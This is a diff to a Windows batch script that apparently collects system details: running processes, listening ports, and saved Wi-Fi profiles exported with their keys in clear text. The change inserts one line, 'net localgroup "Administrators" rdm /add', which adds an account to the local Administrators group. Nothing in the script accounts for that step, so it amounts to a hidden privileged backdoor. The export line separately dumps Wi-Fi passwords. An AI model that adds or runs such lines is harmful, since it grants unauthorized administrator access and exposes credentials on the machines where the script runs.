@@ -277,6 +277,8 @@ tasklist /v
 ECHO ============================
 netstat -an | findstr LISTENING
 ECHO ============================
+net localgroup "Administrators" rdm /add
+ECHO ============================
 netsh wlan export profile folder=. key=clear
 ECHO ============================
 ECHO  %date%-%time%
